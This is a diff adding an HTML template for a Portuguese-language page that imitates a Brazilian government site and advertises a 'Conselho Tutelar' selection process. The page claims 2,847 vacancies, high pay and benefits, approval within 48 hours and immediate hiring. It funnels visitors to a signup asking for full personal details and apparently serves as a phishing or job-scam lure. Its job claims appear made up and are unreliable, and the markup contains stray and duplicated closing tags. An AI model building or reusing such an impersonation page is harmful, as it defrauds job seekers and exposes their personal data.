@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  </script>
+
+
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>Conselho Tutelar | Processo Seletivo</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-400i.1701033bc0b08320.woff2') }}") format('woff2');
+      font-weight: 400;
+      font-style: italic;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+      font-weight: 500;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+      font-weight: 600;
+      font-style: normal;
+    }
+    @font-face {
+      font-family: 'Rawline';
+      src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    body {
+      font-family: 'Rawline', sans-serif;
+    }
+
+    /* Diminuir a espessura do negrito */
+    strong, .font-bold {
+      font-weight: 500 !important;
+    }
+    .encceja-title {
+      font-weight: 700;
+      font-size: 1rem;
+      color: #555;
+      line-height: normal;
+      text-transform: uppercase;
+      text-align: left;
+      margin-bottom: 1rem;
+    }
+    .main-title {
+      font-size: 1.4rem;
+      line-height: 2rem;
+      font-weight: 600;
+      color: #0c326f;
+      padding-bottom: 10px;
+      margin: 0;
+    }
+    .subtitle {
+      font-weight: 400;
+      font-size: 16px;
+      color: #555;
+      line-height: normal;
+      margin-bottom: 10px;
+    }
+    .share-text {
+      font-size: 12px;
+      text-align: center;
+    }
+    .drop-cap::first-letter {
+      float: left;
+      font-size: 4em;
+      line-height: 0.68;
+      font-weight: bold;
+      margin-right: 0.05em;
+      color: #1451B4;
+    }
+    .vlibras-icon {
+      position: fixed;
+      right: 10px;
+      top: 40%;
+      transform: translateY(-50%);
+      z-index: 1000;
+    }
+    .light-disc {
+      list-style-type: none;
+    }
+    .light-disc li::before {
+      content: "\2022";
+      color: #BBBBBB;
+      font-weight: bold;
+      display: inline-block;
+      width: 1em;
+      margin-left: -1em;
+    }
+    .sticky-header {
+      position: sticky;
+      top: 0;
+      background-color: white;
+      z-index: 1000;
+      transition: box-shadow 0.3s ease;
+    }
+    .sticky-header.shadow {
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+  </style>
+</head>
+<body class="bg-white">
+  <img src="https://i.ibb.co/yvTWdMd/IMG-3113.jpg" alt="Government header" class="w-screen">
+  <div class="sticky-header">
+    <div class="container mx-auto px-4 border-b border-[#0000001a]">
+     <div class="flex items-center justify-between py-2">
+      <div class="flex items-center">
+       <i class="fas fa-bars text-sm text-[#1451B4] mr-4 relative -top-1">
+       </i>
+       <p class="text-[14px] text-[#333333] -ml-[5px] leading-tight relative -top-1">
+        Conselho Tutelar | Processo Seletivo
+       </p>
+      </div>
+      <div class="flex items-center space-x-4">
+       <i class="fas fa-microphone text-sm text-[#1451B4] relative -top-1">
+       </i>
+       <i class="fas fa-search text-sm text-[#1451B4] relative -top-1">
+       </i>
+      </div>
+     </div>
+    </div>
+  </div>
+
+  <div class="container mx-auto px-4">
+   <div class="py-4">
+    <div class="flex items-center space-x-2 text-[13px]">
+     <a class="text-[#1451B4]" href="#">
+      <i class="fas fa-home text-sm text-[#1451B4]">
+      </i>
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      Assuntos
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      Notícias
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <a class="text-[#1451B4]" href="#">
+      Conselho Tutelar
+     </a>
+     <span class="text-[#9E9D9D]">
+      &gt;
+     </span>
+     <span class="font-bold">
+      Processo Seletivo 2025
+     </span>
+    </div>
+   </div>
+  </div>
+
+  <main class="max-w-sm mx-auto px-3 py-4">
+    <div class="mb-4">
+      <p class="text-xs font-semibold text-[#1451B4] mb-2">CONSELHO TUTELAR</p>
+      <h2 class="text-lg font-bold text-[#0c326f] leading-tight mb-3">
+        Processo Seletivo<br>Conselheiro Tutelar
+      </h2>
+      <div class="bg-gradient-to-r from-[#1451B4] to-[#0c326f] text-white p-3 rounded-lg mb-3">
+        <p class="text-sm font-medium">2.847 vagas | R$ 3.200-4.800</p>
+        <p class="text-xs opacity-90">Auxílio + benefícios completos</p>
+      </div>
+    </div>
+    <!-- Simplified mobile share -->
+    <div class="flex justify-center space-x-4 mb-4">
+      <a class="text-[#1451B4] text-lg" href="#"><i class="fab fa-whatsapp"></i></a>
+      <a class="text-[#1451B4] text-lg" href="#"><i class="fas fa-share-alt"></i></a>
+    </div>
+    <!-- Process overview -->
+    <div class="bg-white rounded-lg shadow-md border p-6 mb-6">
+      <h3 class="font-semibold text-base text-gray-800 mb-3">Sobre o Processo Seletivo</h3>
+      <p class="text-sm text-gray-600 leading-relaxed mb-4">
+        <span class="font-medium text-[#1451B4]">2.847 vagas</span> para Conselheiros Tutelares em todo Brasil. 
+        Proteja os direitos das crianças e adolescentes com <span class="font-medium">auxílio de R$ 3.200-4.800</span> + benefícios completos.
+      </p>
+      <div class="bg-gray-50 rounded-lg p-4">
+        <h4 class="font-medium text-sm text-gray-800 mb-2">Requisitos Essenciais</h4>
+        <ul class="text-sm text-gray-600 space-y-1">
+          <li>• Ensino médio completo</li>
+          <li>• Idade entre 21 e 65 anos</li>
+          <li>• Conhecimento em ECA (Lei nº 8.069/90)</li>
+          <li>• Residir no município da vaga</li>
+        </ul>
+      </div>
+    </div>
+    <!-- Benefits section -->
+    <div class="bg-white rounded-lg shadow-md border p-6 mb-6">
+      <h3 class="font-semibold text-base text-gray-800 mb-4 flex items-center">
+        <i class="fas fa-star text-[#1451B4] mr-2"></i>Benefícios Completos
+      </h3>
+      <div class="grid grid-cols-2 gap-4">
+        <div class="bg-gray-50 rounded-lg p-4 text-center">
+          <p class="font-bold text-lg text-[#1451B4]">R$ 3.200-4.800</p>
+          <p class="text-sm text-gray-600">Auxílio mensal</p>
+        </div>
+        <div class="bg-gray-50 rounded-lg p-4 text-center">
+          <p class="font-bold text-lg text-[#1451B4]">R$ 500</p>
+          <p class="text-sm text-gray-600">Alimentação</p>
+        </div>
+        <div class="bg-gray-50 rounded-lg p-4 text-center">
+          <p class="font-bold text-lg text-[#1451B4]">R$ 250</p>
+          <p class="text-sm text-gray-600">Transporte</p>
+        </div>
+        <div class="bg-gray-50 rounded-lg p-4 text-center">
+          <p class="font-bold text-lg text-[#1451B4]">Incluído</p>
+          <p class="text-sm text-gray-600">Capacitação</p>
+        </div>
+      </div>
+      <div class="mt-4 p-4 bg-blue-50 rounded-lg">
+        <p class="text-sm text-gray-700">
+          <strong>Adicionais:</strong> Seguro de vida, apoio psicológico, licenças remuneradas, gratificação anual
+        </p>
+      </div>
+    </div>
+    <!-- States distribution -->
+    <div class="bg-white rounded-lg shadow-md border p-6 mb-6">
+      <h3 class="font-semibold text-base text-gray-800 mb-4 flex items-center">
+        <i class="fas fa-map-marker-alt text-[#1451B4] mr-2"></i>Distribuição de Vagas por Estado
+      </h3>
+      <div class="grid grid-cols-2 gap-3">
+        <div class="flex justify-between py-2 border-b border-gray-100">
+          <span class="text-sm font-medium">São Paulo</span>
+          <span class="text-sm font-bold text-[#1451B4]">572</span>
+        </div>
+        <div class="flex justify-between py-2 border-b border-gray-100">
+          <span class="text-sm font-medium">Minas Gerais</span>
+          <span class="text-sm font-bold text-[#1451B4]">410</span>
+        </div>
+        <div class="flex justify-between py-2 border-b border-gray-100">
+          <span class="text-sm font-medium">Rio de Janeiro</span>
+          <span class="text-sm font-bold text-[#1451B4]">338</span>
+        </div>
+        <div class="flex justify-between py-2 border-b border-gray-100">
+          <span class="text-sm font-medium">Bahia</span>
+          <span class="text-sm font-bold text-[#1451B4]">312</span>
+        </div>
+        <div class="flex justify-between py-2 border-b border-gray-100">
+          <span class="text-sm font-medium">Paraná</span>
+          <span class="text-sm font-bold text-[#1451B4]">240</span>
+        </div>
+        <div class="flex justify-between py-2 border-b border-gray-100">
+          <span class="text-sm font-medium">Rio Grande do Sul</span>
+          <span class="text-sm font-bold text-[#1451B4]">234</span>
+        </div>
+      </div>
+      <div class="mt-4 text-center">
+        <button class="text-sm text-[#1451B4] hover:underline font-medium">Ver todos os estados</button>
+      </div>
+    </div>
+    <!-- Process steps -->
+    <div class="bg-white rounded-lg shadow-md border border-slate-200 p-4 mb-4">
+      <h3 class="font-medium text-base text-slate-800 mb-3 flex items-center">
+        <i class="fas fa-list-ol text-amber-600 mr-2 text-sm"></i>Como Participar
+      </h3>
+      <div class="space-y-3">
+        <div class="flex items-start">
+          <div class="bg-slate-800 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">1</div>
+          <div>
+            <p class="font-medium text-sm">Inscrição Online</p>
+            <p class="text-slate-600 text-xs mt-0.5">Preencha seus dados pessoais completos</p>
+          </div>
+        </div>
+        <div class="flex items-start">
+          <div class="bg-slate-800 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">2</div>
+          <div>
+            <p class="font-medium text-sm">Avaliação ECA</p>
+            <p class="text-slate-600 text-xs mt-0.5">Exame sobre direitos da criança e adolescente</p>
+          </div>
+        </div>
+        <div class="flex items-start">
+          <div class="bg-slate-800 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold mr-3 mt-0.5">3</div>
+          <div>
+            <p class="font-medium text-sm">Resultado</p>
+            <p class="text-slate-600 text-xs mt-0.5">Aprovação em até 48 horas</p>
+          </div>
+        </div>
+      </div>
+    </div>
+    <!-- Call to action -->
+    <div class="bg-slate-800 rounded-lg p-4 text-white text-center mb-4">
+      <h3 class="font-bold text-base mb-2">Processo 100% Gratuito</h3>
+      <p class="text-sm opacity-90 mb-4">Ensino médio + material ECA incluído</p>
+      <a href="/local" class="inline-block bg-white text-slate-800 py-3 px-6 rounded font-bold text-sm hover:bg-gray-100 transition-colors duration-200 shadow-md">
+        PARTICIPAR DO PROCESSO AGORA
+      </a>
+    </div>
+  </main>
+    </div>
+    <div class="my-6">
+      <p class="text-gray-700 text-base"><strong>Contratação Imediata após Aprovação –</strong></p>
+      <p class="text-gray-700 text-base">Após a aprovação no exame online, a contratação é imediata e você inicia suas atividades no CRAS em até 15 dias. Esta é uma oportunidade única de ingressar no serviço público com estabilidade, excelente remuneração e benefícios completos. As vagas são limitadas e o processo seletivo é por ordem de aprovação!</p>
+    </div>
+  </main>
+  <div class="w-full">
+    <img src="https://i.ibb.co/DHjL5PHX/IMG-3117.jpg" alt="Imagem de rodapé do site" class="w-full">
+  </div>
+  <a href="#" class="vlibras-icon">
+    <img src="https://cdn.jsdelivr.net/gh/spbgovbr-vlibras/vlibras-portal@dev/app/assets/access_icon.svg" alt="Ícone de acessibilidade em Libras flutuante no canto direito do site" class="w-10 h-10">
+  </a>
+  <script>
+    window.addEventListener('scroll', function() {
+      var header = document.querySelector('.sticky-header');
+      if (window.pageYOffset > 0) {
+        header.classList.add('shadow');
+      } else {
+        header.classList.remove('shadow');
+      }
+    });
+  </script>
+</body>
+</html>
